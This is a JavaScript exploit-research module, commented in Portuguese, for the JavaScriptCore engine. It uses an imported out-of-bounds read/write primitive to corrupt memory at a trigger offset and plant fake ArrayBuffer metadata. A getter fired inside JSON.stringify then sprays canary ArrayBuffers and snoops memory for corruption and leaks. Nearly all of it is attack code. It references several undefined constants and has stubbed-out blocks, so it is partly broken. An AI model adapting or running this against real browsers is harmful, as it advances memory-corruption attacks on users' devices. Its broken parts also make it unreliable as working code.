// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForCorruptedStringifier";
let getter_called_flag = false;
let current_test_results = {
    success: false,
    message: "Teste não iniciado.",
    error: null,
    details: "",
    leaked_canary_info: []
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

class CheckpointForCorruptedStringifier {
    constructor(id) {
        this.id_marker = `CorruptedStringifierCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "CorruptedStringifier_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            success: false, message: "Getter chamado, testando Stringifier corrompido.",
            error: null, details: "", leaked_canary_info: []
        };
        let details_log = [];
        let anomalias_observadas = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
            }

            // 1. Criar objeto complexo para desafiar o Stringifier (que pode estar corrompido)
            let complex_object_to_stringify_internally = {
                propA: "ValorStringLongo_ParaForcarAlocacao_ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                propB: 1234567890,
                propC: true,
                propD: { nested: "profundo", arr: [10,20,30,40,50] },
                propE: null,
                propF: [ {x:1,y:2}, {x:3,y:4} ]
            };
            // Adicionar referência circular para estressar o detector de ciclo do Stringifier
            // @ts-ignore
            complex_object_to_stringify_internally.propD.arr.push(complex_object_to_stringify_internally);
            details_log.push("Objeto complexo para stringify interno criado.");

            // 2. Pulverizar ArrayBuffers "Canário"
            const canary_spray_count = 200;
            const canary_ab_size = 16; // Pequeno para muitos
            const canary_pattern_base = 0xCAFE0000;
            let canary_abs = [];
            logS3("DENTRO DO GETTER: Pulverizando ArrayBuffers canário...", "info", FNAME_GETTER);
            for (let i = 0; i < canary_spray_count; i++) {
                try {
                    let ab = new ArrayBuffer(canary_ab_size);
                    new DataView(ab).setUint32(0, canary_pattern_base + i, true); // Padrão único
                    canary_abs.push(ab);
                } catch (e_alloc) { details_log.push(`Erro ao alocar canário ${i}: ${e_alloc.message}`); }
            }
            details_log.push(`Spray de ${canary_abs.length} canários (ABs de ${canary_ab_size} bytes) concluído.`);

            // 3. Forçar o Stringifier (potencialmente corrompido) a trabalhar
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto complexo...", "subtest", FNAME_GETTER);
            let internal_stringify_result = "";
            let internal_stringify_error = null;
            try {
                internal_stringify_result = JSON.stringify(complex_object_to_stringify_internally);
                logS3("DENTRO DO GETTER: JSON.stringify interno completado. Tamanho do resultado: " + internal_stringify_result.length, "info", FNAME_GETTER);
            } catch (e_json_internal) {
                internal_stringify_error = e_json_internal.message;
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_internal.message}`, "error", FNAME_GETTER);
                details_log.push(`Erro JSON.stringify interno: ${e_json_internal.message}`);
                // Um erro aqui PODE ser interessante se for diferente do erro de ciclo normal
                if (!String(e_json_internal.message).toLowerCase().includes("circular")) {
                    anomalias_observadas = true;
                }
            }

            // 4. Verificar os Canários por corrupção
            logS3("DENTRO DO GETTER: Verificando ArrayBuffers canário por corrupção...", "info", FNAME_GETTER);
            let corrupted_canaries_found = 0;
            for (let i = 0; i < canary_abs.length; i++) {
                const ab_check = canary_abs[i];
                if (!ab_check || !(ab_check instanceof ArrayBuffer) || ab_check.byteLength !== canary_ab_size) {
                    details_log.push(`Canário[${i}] corrompido (tipo/tamanho inválido)! Tipo: ${Object.prototype.toString.call(ab_check)}, Length: ${ab_check?.byteLength}`);
                    corrupted_canaries_found++;
                    anomalias_observadas = true;
                    continue;
                }
                try {
                    const dv_check = new DataView(ab_check);
                    const val_check = dv_check.getUint32(0, true);
                    if (val_check !== (canary_pattern_base + i)) {
                        details_log.push(`Canário[${i}] CONTEÚDO CORROMPIDO! Esperado ${toHex(canary_pattern_base + i)}, Lido ${toHex(val_check)}`);
                        current_test_results.leaked_canary_info.push(`Canary[${i}] data: ${toHex(val_check)} (expected ${toHex(canary_pattern_base + i)})`);
                        corrupted_canaries_found++;
                        anomalias_observadas = true;
                    }
                } catch (e_canary_read) {
                     details_log.push(`Erro ao ler canário[${i}]: ${e_canary_read.message}`);
                     corrupted_canaries_found++;
                     anomalias_observadas = true;
                }
            }
            if (corrupted_canaries_found > 0) {
                logS3(`DENTRO DO GETTER: ${corrupted_canaries_found} CANÁRIOS CORROMPIDOS ENCONTRADOS!`, "vuln", FNAME_GETTER);
            } else {
                 logS3("DENTRO DO GETTER: Nenhum canário parece corrompido.", "good", FNAME_GETTER);
            }

            // 5. Sondar o oob_array_buffer_real por dados inesperados
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por escritas inesperadas...", "info", FNAME_GETTER);
            const snoop_end_t5 = Math.min(0x400, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < snoop_end_t5; offset += 8) {
                if (offset === CORRUPTION_OFFSET_TRIGGER || (offset >= FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE && offset < FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + 16)) continue; // Ignorar nossas escritas
                const val64_t5 = oob_read_absolute(offset, 8);
                if (!val64_t5.equals(AdvancedInt64.Zero)) {
                    const val_str_t5 = val64_t5.toString(true);
                    details_log.push(`Snoop oob_data[${toHex(offset)}] = ${val_str_t5}`);
                    logS3(`SNOOP oob_data[${toHex(offset)}] = ${val_str_t5}`, "leak", FNAME_GETTER);
                    anomalias_observadas = true;
                }
            }

            if (anomalias_observadas) {
                current_test_results.success = true;
                current_test_results.message = "Anomalias (canários corrompidos ou escritas inesperadas em oob_ab) detectadas após stringify interno!";
            } else {
                current_test_results.message = "Nenhuma anomalia óbvia detectada após stringify interno.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForCorruptedStringifier.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_corrupted_stringifier_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST_RUNNER = "executeCorruptedStringifierTestRunner";
    logS3(`--- Iniciando Teste de Stringifier Corrompido ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* ... reset ... */}; // Reset no início

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Plantar metadados sombra (pode não ser usado, mas mantém consistência com alguns testes anteriores)
        // Estes NÃO são os que esperamos que o oob_array_buffer_real use para re-tipagem.
        oob_write_absolute(0x0 + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE_LARGE, 8);
        oob_write_absolute(0x0 + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER_CRASH, 8);
        
        // Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForCorruptedStringifier(1);
        logS3(`CheckpointForCorruptedStringifier objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRINGIFIER CORROMPIDO: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRINGIFIER CORROMPIDO: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.leaked_canary_info && current_test_results.leaked_canary_info.length > 0) {
            logS3("Informações dos Canários Corrompidos:", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaked_canary_info.forEach(info => {
                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error || current_test_results.error_in_getter) {
            logS3(`  Erro reportado: ${current_test_results.error || current_test_results.error_in_getter}`, "error", FNAME_TEST_RUNNER);
        }
    } else {
        logS3("RESULTADO TESTE STRINGIFIER CORROMPIDO: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    logS3(`--- Teste de Stringifier Corrompido Concluído ---`, "test", FNAME_TEST_RUNNER);
}
